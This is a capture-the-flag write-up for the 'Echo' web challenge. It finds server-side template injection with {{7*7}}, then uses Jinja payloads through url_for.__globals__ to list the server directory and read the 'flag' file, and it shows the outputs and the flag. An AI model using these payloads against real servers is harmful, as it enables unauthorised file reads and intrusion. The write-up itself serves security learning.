# echo

---

## Challenge Description 
My website keeps repeating what I input. How can I make it stop.

`nc c2.lagncrash.com 8001`

---

## Challenge Solution
Firstly, I used the command given to netcat into the server and then accessed the link.
```
[spawner] Spinning up new instance of:
[spawner]     Echo
[spawner]
[spawner] Access your challenge at:
[spawner]     http://c2.lagncrash.com:11901/
[spawner]
[spawner] ------------------------- NOTE --------------------------
[spawner] Hit [Enter] to destroy your challenge instance once done!
```

Visiting the link, we will see the following webpage with an input and submit button.

![Screenshot 2022-03-28 010416](https://user-images.githubusercontent.com/101789488/160292400-df68b164-3290-43a8-b167-c8f6310cff80.png)

After testing, we would know that the Echo Server takes the user input and displays it on the screen. As such, I want to try and get the server to display some information such as the flag. Since previous challenges made use of the [Server Side Template Injection (SSTI)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) vulnerability, so I tested for that using the following payload:
```
{{7*7}}
```

Submitting the input gave us the result we wanted:
```
49
```

After finding the SSTI vulnerability, I tried a method I learnt from the `Outline - Task 2` challenge. This method was to list all the directories and see if I could retrieve the flag from any of the files. To do this, I used the following payload:
```
{{url_for.__globals__.os.__dict__.listdir('./')}}
```

After submitting the payload, the program displayed the following back to us:
```
['Dockerfile', 'main.py', 'requirements.txt', 'flag', '__pycache__']
```

From the results, we can see that there is a file named `flag` and we want to display that on the screen. As such, I used the following payload:
```
{{url_for.__globals__.__builtins__.open('flag').read()}}
```

Just like that, we were able to display the flag on the screen.

![Screenshot 2022-03-28 010327](https://user-images.githubusercontent.com/101789488/160292368-d4df4ec1-5521-4949-9c59-26bd62b129e9.png)
```
LNC2022{s3rv3r_s1d3_t3mplAte_Inj3ct10n_i5_fUn}
```